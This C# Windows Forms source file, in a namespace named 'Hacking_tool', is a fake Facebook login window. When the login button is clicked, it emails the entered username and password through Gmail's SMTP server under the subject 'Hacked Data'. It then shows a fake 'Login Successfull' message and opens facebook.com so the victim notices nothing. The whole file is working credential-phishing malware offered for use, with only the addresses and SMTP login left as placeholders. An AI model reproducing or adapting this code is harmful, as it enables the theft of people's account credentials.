using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;

namespace Hacking_tool
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Label1_Click(object sender, EventArgs e)
        {

        }

        private void BtnClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void BtnLogin_Click(object sender, EventArgs e)
        {
            try
            {
                MailMessage msg = new MailMessage();
                msg.From = new MailAddress("email", "Hacked");
                msg.To.Add(new MailAddress("email"));
                msg.Subject = "Hacked Data";
                msg.Body = "Here is data: UserName= " + txtBoxUer.Text + " and Password= " + txtBoxPass.Text + "";
                msg.IsBodyHtml = false;

                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Credentials = new NetworkCredential("email", "password"); // email and password
                smtp.EnableSsl = true;
                smtp.Send(msg);
                MessageBox.Show("Login Successfull", "Facebook", MessageBoxButtons.OK, MessageBoxIcon.Information);
                System.Diagnostics.Process.Start("https://www.facebook.com/");
                this.Close();

            } 
            catch (Exception)
            {
                MessageBox.Show("Login Error", "Facebook", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void Label3_Click(object sender, EventArgs e)
        {

        }

        private void TxtBoxUer_TextChanged(object sender, EventArgs e)
        {

        }

        private void Label3_Click_1(object sender, EventArgs e)
        {

        }
    }
}
